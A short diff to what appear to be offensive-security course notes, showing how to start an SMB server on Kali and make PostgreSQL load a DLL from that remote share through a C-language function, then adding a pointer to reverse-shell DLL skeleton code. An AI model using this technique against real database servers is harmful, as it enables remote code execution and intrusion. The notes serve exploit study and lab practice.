@@ -169,3 +169,5 @@ Start and SMB server: `kali@kali:~$ sudo impacket-smbserver awae /home/kali/awae
 CREATE OR REPLACE FUNCTION remote_test(text, integer) RETURNS void AS $$\\192.168.119.120\awae\awae.dll$$, $$awae$$ LANGUAGE C STRICT;
 SELECT remote_test($$calc.exe$$, 3);
 ```
+
+See [PostgreSQL Extensions](/skeleton-scripts/PostgreSQL Extensions/) for skeleton code for a reverse shell DLL.
